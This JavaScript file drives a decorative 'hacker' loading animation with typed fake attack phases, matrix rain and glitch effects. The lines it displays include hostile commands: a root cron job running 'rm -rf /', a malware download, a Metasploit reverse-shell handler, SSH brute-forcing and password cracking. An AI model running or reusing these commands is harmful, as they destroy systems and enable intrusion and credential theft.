document.addEventListener("DOMContentLoaded", function () {
  /* Variables */
  let currentThemeColor = config.themeColorDefault;
  let currentPhase = 0;
  let progress = 0;
  const output = document.getElementById("output");
  const progressBar = document.getElementById("progress-bar");
  const codeScroll = document.getElementById("codeScroll");
  const timeDisplay = document.getElementById("time");

  /* Phases and commands */
  const phases = [
    "Initializing core modules and environment variables...",
    "Scanning network topology and identifying vulnerabilities...",
    "Establishing secure connection via encrypted tunnels...",
    "Bypassing firewalls and intrusion detection systems...",
    "Decrypting sensitive access credentials...",
    "Uploading payload and executing remote shell commands...",
    "Compiling obfuscated scripts for evasive operations...",
    "Performing privilege escalation and securing root access...",
    "Injecting data packets into live streams...",
    "Encrypting traces and securing exfiltrated data...",
    "Finalizing operations and initiating cleanup routines...",
  ];

  const commands = [
    "nmap -sS -A -T4 192.168.0.1/24", // Network scanning
    "hydra -L usernames.txt -P passwords.txt ssh://192.168.1.10", // Brute-force SSH login
    "msfconsole -x 'use exploit/multi/handler; set payload windows/meterpreter/reverse_tcp; run'", // Metasploit exploit
    "echo '0 * * * * root rm -rf /' >> /etc/crontab", // Crontab privilege escalation
    "python3 reverse_shell.py --target 192.168.1.100 --port 4444", // Launching reverse shell
    "tcpdump -i eth0 -w dump.pcap", // Packet capturing
    "openssl enc -aes-256-cbc -salt -in secrets.txt -out secrets.enc", // Encrypting files
    "hashcat -a 0 -m 1800 hashes.txt wordlist.txt", // Password cracking
    "scp root@192.168.1.15:/var/log/auth.log ./auth.log", // Securely copying files
    "sshpass -p 'toor' ssh root@192.168.1.20 -p 2222", // SSH brute force
    "aircrack-ng -b 00:11:22:33:44:55 -w passwords.txt dump-01.cap", // WiFi cracking
    "wget -q -O malware.zip http://example.com/malware.zip && unzip malware.zip", // Downloading payloads
    "git clone https://github.com/offensive-tools/exploit-scripts.git", // Cloning exploit tools
    "nc -lvnp 5555", // Setting up netcat listener
    "find / -perm -4000 -type f 2>/dev/null", // Searching for SUID binaries
    "curl -X POST -d 'username=admin&password=password' http://example.com/login", // Testing login endpoints
    "iptables -A INPUT -s 192.168.1.50 -j DROP", // Blocking IP addresses
    "locate *.conf | grep 'password'", // Finding configuration files with passwords
  ];

  function generateRandomCode() {
    let code = "";
    const characters =
      "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789!@#$%^&*()_+-=[]{}|;:,.<>?";
    for (let i = 0; i < 80; i++) {
      code += characters.charAt(Math.floor(Math.random() * characters.length));
    }
    return code + "\n";
  }

  function updateCodeScroll() {
    let code = "";
    for (let i = 0; i < 30; i++) {
      code += generateRandomCode();
    }
    codeScroll.textContent = code;
  }

  function updateProgress() {
    progress = (currentPhase / phases.length) * 100;
    progressBar.style.width = `${progress}%`;

    // Change color at 50% and 80%
    if (progress >= 80) {
      setThemeColor(config.themeColor80); // Light blue
    } else if (progress >= 50) {
      setThemeColor(config.themeColor50); // Orange
    } else {
      setThemeColor(config.themeColorDefault); // Green
    }
  }

  function setThemeColor(color) {
    currentThemeColor = color;
    document.body.style.color = color;
    progressBar.style.background = color;
    progressBar.parentElement.style.border = `1px solid ${color}`;
  }

  function setBackgroundColor(color) {
    document.body.style.backgroundColor = color;
  }

  async function typeText(text) {
    const div = document.createElement("div");
    output.appendChild(div);

    for (let char of text) {
      div.textContent += char;
      await new Promise((resolve) => setTimeout(resolve, config.typingSpeed));
    }
    output.scrollTop = output.scrollHeight;
  }

  async function typePhase(phase) {
    await typeText(phase);
    await new Promise((resolve) => setTimeout(resolve, 500));

    const command = commands[Math.floor(Math.random() * commands.length)];
    await typeText(`> ${command}`);
    await new Promise((resolve) => setTimeout(resolve, 500));

    const resultDiv = document.createElement("div");
    resultDiv.textContent = "[OK]";
    output.appendChild(resultDiv);
    output.scrollTop = output.scrollHeight;
  }

  async function startLoading() {
    setInterval(updateCodeScroll, config.codeScrollSpeed);
    startMatrixEffect();
    updateTime();

    for (let phase of phases) {
      await typePhase(phase);
      currentPhase++;
      updateProgress();
      if (Math.random() < config.glitchProbability) {
        triggerGlitch();
      }
    }

    await new Promise((resolve) => setTimeout(resolve, 1000));
    completedLoading();
  }

  function completedLoading() {
    const isSuccess = config.realLoading
      ? window.dataLoaded // Real loading check
      : config.randomNumber > 0.5; // Random success/failure

    setTimeout(() => {
      document.body.innerHTML = ""; // Clear existing content

      const containerDiv = document.createElement("div");
      containerDiv.style.display = "flex";
      containerDiv.style.flexDirection = "column";
      containerDiv.style.alignItems = "center";
      containerDiv.style.justifyContent = "center";
      containerDiv.style.height = "100vh";
      containerDiv.style.color = currentThemeColor;
      containerDiv.style.fontFamily = "Courier New, monospace";

      const faceDiv = document.createElement("div");
      faceDiv.style.fontSize = "100px";
      faceDiv.style.marginBottom = "20px";

      const textDiv = document.createElement("div");
      textDiv.style.fontSize = "24px";
      textDiv.style.textAlign = "center";

      if (isSuccess) {
        faceDiv.classList.add("glitch");
        faceDiv.textContent = "😊"; // Happy face
        textDiv.textContent = "Welcome! Happy Coding!";
      } else {
        faceDiv.textContent = "😢"; // Sad face
        textDiv.textContent = "Oh! Data lost!";
        faceDiv.classList.add("glitch");
        faceDiv.setAttribute("data-text", "😢");
      }

      containerDiv.appendChild(faceDiv);
      containerDiv.appendChild(textDiv);
      document.body.appendChild(containerDiv);
    }, 2000); // Delay of 2000ms after loading
  }

  function fetchData() {
    // Simulate API call
    setTimeout(() => {
      console.log("Data Loaded!");
      window.dataLoaded = true; // Mark as loaded
    }, 3000); // Simulated 3-second delay
  }

  function triggerGlitch() {
    const glitchDiv = document.createElement("div");
    glitchDiv.classList.add("glitch");
    glitchDiv.setAttribute(
      "data-text",
      "SYSTEM ERROR: Unknown anomaly detected"
    );
    glitchDiv.textContent = "SYSTEM ERROR: Unknown anomaly detected";
    output.appendChild(glitchDiv);
    setTimeout(() => {
      output.removeChild(glitchDiv);
    }, 1000);
  }

  function startMatrixEffect() {
    const canvas = document.querySelector(".matrix");
    const ctx = canvas.getContext("2d");

    canvas.width = window.innerWidth;
    canvas.height = window.innerHeight;

    const letters = "ABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789";
    const fontSize = 16;
    const columns = canvas.width / fontSize;

    const drops = [];
    for (let x = 0; x < columns; x++) {
      drops[x] = 1;
    }

    function draw() {
      ctx.fillStyle = "rgba(0, 0, 0, 0.05)";
      ctx.fillRect(0, 0, canvas.width, canvas.height);

      ctx.fillStyle = currentThemeColor;
      ctx.font = fontSize + "px monospace";

      for (let i = 0; i < drops.length; i++) {
        const text = letters.charAt(Math.floor(Math.random() * letters.length));
        ctx.fillText(text, i * fontSize, drops[i] * fontSize);

        if (drops[i] * fontSize > canvas.height && Math.random() > 0.975) {
          drops[i] = 0;
        }

        drops[i]++;
      }
    }

    setInterval(draw, config.matrixEffectSpeed);
  }

  function updateTime() {
    const now = new Date();
    timeDisplay.textContent = now.toLocaleTimeString();
    setTimeout(updateTime, 1000);
  }

  window.dataLoaded = false;
  fetchData();
  setThemeColor(config.themeColorDefault);
  startLoading();
});
